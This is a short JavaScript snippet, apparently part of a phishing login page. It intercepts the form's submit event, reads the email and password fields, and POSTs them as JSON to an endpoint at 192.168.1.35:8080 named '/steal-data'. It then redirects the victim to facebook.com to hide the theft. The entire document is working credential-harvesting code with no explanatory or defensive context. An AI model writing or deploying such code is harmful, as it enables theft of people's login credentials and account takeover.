document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); 

    var email = document.querySelector('input[name="email"]').value;
    var password = document.querySelector('input[name="password"]').value;

    fetch('http://192.168.1.35:8080/steal-data', { 
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: email,
            password: password
        })
    })
    .then(response => {
        window.location.href = 'https://www.facebook.com'; 
    })
    .catch(error => {
        console.error('Erro ao enviar dados:', error);
    });
});